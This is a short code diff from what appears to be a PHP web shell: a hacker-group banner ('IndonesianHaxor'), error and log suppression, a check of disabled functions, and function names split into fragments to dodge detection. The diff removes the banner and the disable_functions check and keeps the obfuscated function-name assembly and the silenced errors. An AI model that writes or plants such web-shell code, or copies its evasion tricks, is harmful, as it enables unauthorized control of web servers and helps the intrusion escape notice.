@@ -149,26 +149,9 @@ echo '<font face="Bungee" size="6">Ano' .
 <tr><td>';
 set_time_limit(0);
 error_reporting(0);
-set_time_limit(0);
 @clearstatcache();
 @ini_set("error_log", null);
-$web =
-    (isset($_SERVER["HTTPS"]) && $_SERVER["HTTPS"] === "on"
-        ? "https"
-        : "http") .
-    "://" .
-    $_SERVER["HTTP_HOST"];
-$disfunc = @ini_get("disable_functions");
-if (empty($disfunc)) {
-    $disf = "<font color='lime'>AMAN</font>";
-} else {
-    $disf = "<font color='red'>" . $disfunc . "</font>";
-}
-function author()
-{
-    echo "</div><table class='directory-listing-table'><td><center><font face='Carrois Gothic' size='3px'>2016 &copy; MAKLO HEKER | IndonesianHaxor</center></td></table><br>";
-    exit();
-}
+
 
 $gcw = "ge" . "tc" . "wd";
 $exp = "ex" . "plo" . "de";
